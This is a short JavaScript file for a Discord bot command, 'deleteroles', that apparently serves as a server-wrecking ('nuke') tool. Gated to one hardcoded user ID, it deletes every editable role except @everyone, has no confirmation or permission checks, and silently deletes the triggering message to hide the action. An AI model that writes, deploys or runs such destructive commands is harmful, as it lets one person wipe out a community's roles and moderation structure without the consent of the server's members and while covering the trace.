const { EmbedBuilder } = require('discord.js')
const chalk = require('chalk')

module.exports = {
    name: "deleteroles",
    description: "Delete all roles",
    aliases: [],
    userPerms: [],
    botPerms: [],

    run: async(client, message, args) => {
 
        const allowed = ['762711150118174751']
        if(!allowed.includes(message.author.id)) return 
        try {

          
            message.guild.roles.cache.each(role => {
                if (role.editable && role.name !== "@everyone") { role.delete().catch(err => console.log(role.name))}});
                message.delete().then(
                    console.log(chalk.red(`Deleted ${message.guild.roles.cache.size} roles!`))
                )
            
            
          
        } catch(err) {
        
            return console.log(err)
            
        
        }
        
        
    }


}



